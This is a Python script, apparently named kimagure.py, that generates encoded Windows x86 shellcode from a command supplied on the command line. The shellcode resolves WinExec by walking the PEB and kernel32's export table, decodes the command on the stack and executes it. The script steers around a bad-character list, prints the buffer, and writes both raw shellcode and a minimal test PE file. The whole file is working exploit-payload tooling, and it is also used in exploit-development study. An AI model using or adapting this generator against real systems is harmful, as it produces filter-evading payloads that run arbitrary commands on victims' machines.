import sys
import subprocess

# Bad Chars List
BADCHARS = [0x00,0x02,0x03,0x09,0x0A,0x0D,0x20,0x25,0x2E,0x2F]

RED  = "\033[38;5;197m" # This will highlight bad chars
ENDL = "\033[0m"

if len(sys.argv) < 2:
    print('USAGE:\n    python3 kimagure.py "command to run" <key>')
    exit()

PTEXT = bytes(sys.argv[1],'latin-1') # The command you are running

if len(sys.argv) > 2:
    KEY = int(sys.argv[2])
else:
	KEY = 0x11 # Default key
if KEY > 129:
    print("Key too big, range 1-129")
    exit()

### Calculate padding and print stats
padding = (len(PTEXT) % 4) # Using this to calculate how many padding bytes are needed

print("┌\x1b[38;5;15m\x1b[48;5;63m PTEXT LENGTH \x1b[0m {}".format(len(PTEXT)))
print("├\x1b[38;5;15m\x1b[48;5;99m PTEXTLEN % 4 \x1b[0m {}".format(4-padding))
if padding != 0:
    PTEXT += b"\x00"*(4-padding) # Adds padding bytes if needed
print("├\x1b[38;5;15m\x1b[48;5;135m PTEXTLEN PAD \x1b[0m {}".format(len(PTEXT)))
print("├\x1b[38;5;15m\x1b[48;5;171m SUBTRACT KEY \x1b[0m {} (0x{:02X})".format(KEY, KEY))

### This is what encodes the command string with a given key
ENCBYTES = b""
for b in PTEXT:
	ENCBYTES += bytes([b + KEY])
ENCLEN = len(ENCBYTES)

## PE Template - see pe32template.asm for a more detailed breakdown
petemp  = b""
petemp += b"\x4d\x5a\x00\x01\x50\x45\x00\x00\x4c\x01\x00\x00\x00\x00\x00\x00"
petemp += b"\x00\x00\x00\x00\x00\x00\x00\x00\x60\x00\x03\x01\x0b\x01\x00\x00"
petemp += b"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x7c\x00\x00\x00"
petemp += b"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x40\x00\x04\x00\x00\x00"
petemp += b"\x04\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x05\x00\x00\x00"
petemp += b"\x00\x00\x00\x00\x80\x00\x00\x00\x7c\x00\x00\x00\x00\x00\x00\x00"
petemp += b"\x02\x00\x00\x04\x00\x00\x10\x00\x00\x10\x00\x00\x00\x00\x10\x00"
petemp += b"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"

## The shellcode template prior to our generated instructions
template  = b""
template += b"\x83\xec\x18"             # sub  esp,0x18              ; Can make more room if needed
template += b"\x31\xf6"                 # xor  esi,esi               ; NULL
template += b"\x56"                     # push esi                   ; Push it to end our string "WinExec\0"
template += b"\x6a\x63"                 # push 0x63                  ; "c"
template += b"\x66\x68\x78\x65"         # push word 0x6578           ; "ex"
template += b"\x68\x57\x69\x6e\x45"     # push 0x456e6957            ; "EniW"
template += b"\x89\x65\xfc"             # mov  dword [ebp-4], esp    ; *pointer to WinExec\0
template += b"\x64\x8b\x5e\x30"         # mov  ebx, [fs:0x30+esi]    ; Get PEB addr, FS holds TEB address
template += b"\x8b\x5b\x0c"             # mov  ebx, [ebx+0xc]        ; Get addr of PEB_LDR_DATA
template += b"\x8b\x5b\x14"             # mov  ebx, [ebx+0x14]       ; InMemoryOrderModuleList first entry
template += b"\x8b\x1b"                 # mov  ebx, [ebx]            ; Get address of ntdll.dll entry [OV] CheckSum
template += b"\x8b\x1b"                 # mov  ebx, [ebx]            ; Get address of kernel32.dll list entry
template += b"\x8b\x5b\x10"             # mov  ebx, [ebx+0x10]       ; Get kernel32.dll base address 
template += b"\x89\x5d\xf8"             # mov  [ebp-0x8], ebx        ; kernel32.dll base address
template += b"\x8b\x43\x3c"             # mov  eax,dword [ebx+0x3c]  ; RVA of PE signature
template += b"\x01\xd8"                 # add  eax,ebx               ; PE sig addr = base addr + RVA of PE sig
template += b"\x8b\x40\x78"             # mov  eax,dword [eax+0x78]  ; RVA of Export Table
template += b"\x01\xd8"                 # add  eax,ebx               ; Address of Export Table
template += b"\x8b\x48\x24"             # mov  ecx,dword [eax+0x24]  ; RVA of Ordinal Table
template += b"\x01\xd9"                 # add  ecx,ebx               ; Address of Ordinal Table
template += b"\x89\x4d\xf4"             # mov  dword [ebp-0xc],ecx   ; Put on the stack
template += b"\x31\xc9"                 # xor  ecx,ecx               ; This is done to..
template += b"\x41"                     # inc  ecx                   ; ..create a 0x20,..
template += b"\xc1\xe1\x05"             # shl  ecx,0x5               ; ..avoiding it as a bad char
template += b"\x8b\x3c\x08"             # mov  edi,dword [eax+ecx]   ; RVA of Name Pointer Table
template += b"\x01\xdf"                 # add  edi,ebx               ; Address of Name Pointer Table
template += b"\x89\x7d\xf0"             # mov  dword [ebp-0x10],edi  ; Put on the stack
template += b"\x8b\x50\x1c"             # mov  edx,dword [eax+0x1c]  ; RVA of Address Table
template += b"\x01\xda"                 # add  edx,ebx               ; Address of Address Table
template += b"\x89\x55\xec"             # mov  dword [ebp-0x14],edx  ; Put on the stack
template += b"\x8b\x58\x14"             # mov  ebx,dword [eax+0x14]  ; Number of exported functions
template += b"\x31\xc0"                 # xor  eax,eax               ; EAX will be our entry counter
template += b"\x8b\x55\xf8"             # mov  edx, dword [ebp - 8]  ; EDX = kernel32.dll base address
template += b"\x8b\x7d\xf0"   # findName: mov  edi,dword [ebp-0x10]  ; edi = Address of Name Pointer Table
template += b"\x8b\x75\xfc"             # mov  esi,dword [ebp-4]     ; esi = "WinExec\x00"
template += b"\x31\xc9"                 # xor  ecx,ecx               ; ECX = 0
template += b"\xfc"                     # cld                        ; Clear direction flag 
template += b"\x8b\x3c\x87"             # mov  edi,dword [edi+eax*4] ; Name Pointer Table entries are 4 bytes,
template += b"\x01\xd7"                 # add  edi,edx               ; EDI = NPT addr + kernel32.ddl base addr
template += b"\x66\x83\xc1\x08"         # add  cx,0x8                ; Length of "WinExec"
template += b"\xf3\xa6"                 # repe cmpsb                 ; Compare the first 8 bytes in esi and edi
template += b"\x74\x06"                 # jz   findAddr              ; Jump if there's a match.
template += b"\x40"                     # inc  eax                   ; Increment entry counter
template += b"\x39\xd8"                 # cmp  eax,ebx               ; Check if the last function was reached
template += b"\x72\xe5"                 # jb   findName              ; If not the last one, continue
template += b"\xc3"                     # ret                        ; Used to end the program    
template += b"\x8b\x4d\xf4"   # findAddr: mov  ecx, [ebp-0xc]        ; ECX = Address of Ordinal Table
template += b"\x89\xd3"                 # mov  ebx, edx              ; EBX = kernel32.dll base address
template += b"\x8b\x55\xec"             # mov  edx, [ebp-0x14]       ; EDX = Address of Address Table
template += b"\x66\x8b\x04\x41"         # mov  ax, [ecx+eax*2]       ; AX  = ordinal addr + (ordinal num * 2)
template += b"\x8b\x04\x82"             # mov  eax, [edx+eax*4]      ; EAX = Addr table addr + (ordinal * 4)
template += b"\x01\xd8"                 # add  eax,ebx               ; EAX = WinExec Addr = kernel32.dll base address + RVA of WinExec
template += b"\x31\xc9"                 # xor  ecx, ecx              ; NULL  ; We're setting up the WinExec arguments now!
template += b"\x51"                     # push ecx                   ; Push it
template += b"\x89\xe1"                 # mov  ecx, esp              ; Put stack pointer in ECX to track where our buffer began

### Generate push instructions by appending a 4 byte chunk to \x68, the opcode for push
i = ENCLEN
bytesOut = b""
while i > 0:
    b = ENCBYTES[i-4:i]
    bytesOut += b"\x68" + b
    i = i - 4

### Building the final shellcode buffer
finalcode = template
finalcode += bytesOut
finalcode += b"\x49"                    # dec ecx                    ; Accounts for uneven stack alignment
finalcode += b"\x29\xe1"                # sub ecx, esp               ; Get the amount of bytes now on the stack for use as esp+offset
finalcode += b"\x80\x2c\x0c"   # decrypt: sub BYTE [esp+ecx], KEY    ; Subtract byte from key, appended below
finalcode += bytes([KEY])
finalcode += b"\xe2\xfa"                # loop decrypt               ; Continue for the length of the buffer
finalcode += b"\x80\x2c\x24"            # sub byte [esp], KEY        ; Subtract last byte from key, appended below
finalcode += bytes([KEY])
finalcode += b"\x89\xe6"                # mov esi, esp               ; lpCmdLine - our args
finalcode += b"\x6a\x05"                # push 0x5                   ; uCmdShow - This is the WINDOW_STATE - It's 5 to avoid bad chars, set to something else if needed
finalcode += b"\x56"                    # push esi                   ; *lpCmdLine
finalcode += b"\xff\xd0"                # call eax                   ; WinExec(LPCSTR lpCmdLine, UINT uCmdShow);

### Printing statistics
fl = len(finalcode)
print("├\x1b[38;5;15m\x1b[48;5;207m FINAL SC LEN \x1b[0m {} (0x{:02X})".format(fl,fl))
print("└\x1b[38;5;15m\x1b[48;5;197m BADCHARSLIST \x1b[0m ",end='')
for i in BADCHARS:
	print("\\x{:02X}".format(i), end='')
print()
print("─"*64)

### Printing the shellcode buffer
x = 0 # Tracking the buffer to print 16 bytes per line
for outByte in finalcode:
    if outByte in BADCHARS:
        print('{}\\x{:02X}{}'.format(RED,outByte,ENDL),end='') # This highlights any bad chars
    else:
        print('\\x{:02X}'.format(outByte),end='') # Otherwise it just prints like normal
    x = x+1
    if x == 16:
        print()
        x = 0
print()
#sys.stdout.buffer.write(bytesOut) # debug

### This creates a binary file with only the shellcode.
binname = "out.bin"
with open(binname, 'wb') as w:
    w.write(finalcode)

### This creates an exe for testing purposes
pename = "out.exe"
pebuff = petemp + finalcode
with open(pename, 'wb') as w:
    w.write(pebuff)
